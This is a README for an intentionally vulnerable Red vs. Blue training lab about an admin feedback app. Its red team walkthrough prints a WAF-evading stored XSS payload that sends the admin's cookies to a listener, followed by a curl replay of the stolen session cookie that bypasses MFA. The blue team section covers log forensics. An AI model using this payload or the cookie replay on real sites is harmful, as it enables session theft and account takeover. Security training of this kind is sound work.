# SCENARIO75 "Cookie Reuse & MFA Bypass" Cyber Range Lab

A self-contained Red vs. Blue training lab simulating a vulnerable corporate
**Admin Feedback System**. Built for defensive/offensive security training only.

> Intentionally vulnerable. Deploy only inside an isolated lab network
> (e.g. an internal Proxmox VM), never expose to the public internet.

## Architecture

```
                    Proxmox VM (Linux, Docker Compose)
      ┌───────────────────────────────────────────────────┐
      │                                                     │
      │   [web] Node.js app        [blue-team] SSH box      │
      │   port 3075 (HTTP)          port 2275 (SSH)          │
      │   - vulnerable app          - analyst / blue_team_rocks
      │        │                          │                 │
      │        └──────────► shared volume ◄──────────┘      │
      │              /opt/admin/logs (access.log, error.log)│
      │                                                     │
      │   [log-injector] one-shot job: seeds simulated       │
      │   attack evidence into the logs on startup           │
      └───────────────────────────────────────────────────┘

   Red Team → attacks via browser → http://<vm-ip>:3075
   Blue Team → investigates via  → ssh analyst@<vm-ip> -p 2275
```

## Deployment (Proxmox VM)

1. Provision a Linux VM (Ubuntu 22.04+) on Proxmox, give it an internal-only
   network interface (e.g. `feedback.admin.local`).
2. Install Docker + Docker Compose:
   ```bash
   curl -fsSL https://get.docker.com | sh
   sudo apt install -y docker-compose-plugin
   ```
3. Clone this repo onto the VM:
   ```bash
   git clone <this-repo-url>
   cd nmd-lab
   ```
4. Build and start everything:
   ```bash
   docker compose up -d --build
   ```
5. Verify services:
   - Web app: `curl -I http://localhost:3075`
   - SSH: `ssh analyst@localhost -p 2275` (password: `blue_team_rocks`)
   - Logs seeded: `docker exec scenario75-blue-team cat /opt/admin/logs/access.log`

That's it the log-injector container runs once automatically on `up` and
seeds a realistic attack sequence into the shared log volume.

## Red Team Walkthrough (attack chain)

**Phase 1 Recon**
1. `curl -I http://target:3075/` → note `X-Powered-By: Node.js`
2. `curl http://target:3075/robots.txt` → reveals `/api/verify-mfa` is "hidden"
3. View page source of `/` → ASCII art comment hints at `robots.txt`
4. Note the `pre_mfa_session` cookie is set and **not** `HttpOnly`

**Phase 2 Defense Evasion (WAF bypass + XSS)**
1. Submit feedback with a plain payload:
   ```
   <script>alert(1)</script>
   ```
   → Blocked, returns `403` (WAF working as intended... for basic payloads)
2. Bypass using an HTML5 vector the WAF doesn't inspect:
   ```html
   <svg onload="fetch('http://localhost:4444/?stolen='+encodeURIComponent(window['docu'+'ment']['coo'+'kie']))">
   ```
   → Accepted (`200`), stored as feedback

   **For a real live exfiltration demo** (recommended for the presentation):
   1. In a separate terminal, start a listener that simulates the attacker's
      server: `python3 -m http.server 4444`
   2. Submit the payload above as feedback (via the form on `/`, or `curl`
      against `/api/feedback`).
   3. Log in as admin and open `/dashboard` (this simulates the admin
      reviewing feedback and the payload firing in their browser).
   4. Watch the `python3 -m http.server` terminal you'll see an incoming
      `GET /?stolen=adm_sess_xxx%3Dauthenticated...` request line appear
      live, proving the admin's session cookie was exfiltrated to the
      attacker in real time. (The browser will still send the request even
      though CORS blocks reading the *response* that's expected and is
      exactly what makes this exfiltration technique work in the real world.)

**Phase 3 Initial Access (MFA bypass via cookie replay)**
1. Log in normally as admin (`/login` → `/api/verify-mfa`) to obtain a real
   `adm_sess_<token>` cookie.
2. When the admin opens `/dashboard` to review feedback, the stored XSS
   payload fires **in the admin's browser**, exfiltrating their `adm_sess_*`
   cookie to the attacker.
3. Attacker replays the stolen cookie directly:
   ```bash
   curl http://target:3075/dashboard -H "Cookie: adm_sess_<stolen>=authenticated"
   ```
4. Backend trusts any `adm_sess*`-prefixed cookie and **never re-checks
   `/api/verify-mfa`** → attacker lands on `/dashboard` and retrieves:
   ```
   SCENARIO75{RED_C00k13_REDACTED0wn3d}
   ```

## Blue Team Walkthrough (forensics)

1. SSH in: `ssh analyst@target -p 2275`
2. Inspect the seeded evidence:
   ```bash
   cat /opt/admin/logs/access.log
   cat /opt/admin/logs/error.log
   ```
3. Findings to walk through live:
   - Baseline/legit admin traffic from `192.168.1.100` vs. attacker traffic
     from `10.10.14.50` (note: `10.10.14.50` falls in the `10.10.14.0/24`
     external/lab-attacker subnet, clearly distinct from internal `192.168.1.0/24`)
   - First WAF block (`<script>` payload) logged at `18:50:15`
   - Successful bypass + `/dashboard` access at `18:51:55` with status `200`
   - Suspicious `X-Forwarded-For` value on that request decode it:
     ```bash
     echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfS*****X000c3Qzcn0}" | base64 -d
     ```
     → yields the Blue Team flag:
     ```
     SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
     ```
   - `error.log` anomaly entry at `18:53:10`: *"Authentication bypass anomaly"*
     confirms the attacker IP never touched `/api/verify-mfa` before
     reaching `/dashboard`, proving the MFA step was skipped.

## Resetting the Lab

The stored feedback (including any XSS payloads you submit) lives only in
the `web` container's memory it is automatically wiped every time that
container restarts. The access/error logs, however, persist in a Docker
named volume (`admin-logs`) so they survive restarts.

```bash
# Stop everything, keep the logs
docker compose down

# Full reset: stop everything AND wipe the logs/volume
docker compose down -v

# Rebuild and start fresh (re-seeds the simulated attack logs automatically)
docker compose up -d --build
```

## Provisioning a Proxmox VM

`scripts/provision-vm.sh` is meant to be run **inside a fresh Ubuntu 22.04
VM guest** (created ahead of time on a Proxmox host by the infra team). It
installs Docker, clones this repo, and brings the whole stack up it does
**not** install or configure Proxmox itself, since Proxmox is the
hypervisor/host layer and is assumed to already exist.

```bash
# Run this ON the Proxmox VM guest, as a user with sudo:
curl -fsSL https://raw.githubusercontent.com/<you>/<repo>/main/scripts/provision-vm.sh | bash
# or, after cloning manually:
bash scripts/provision-vm.sh
```

## Repo structure

```
.
├── server.js              # Vulnerable Node.js/Express app
├── package.json
├── Dockerfile              # Web app image
├── docker-compose.yml       # Orchestrates web + blue-team + log-injector
├── blue-team/
│   └── Dockerfile           # SSH box for Blue Team access
├── scripts/
│   └── inject-logs.sh       # Seeds simulated attack evidence into logs
└── README.md
```
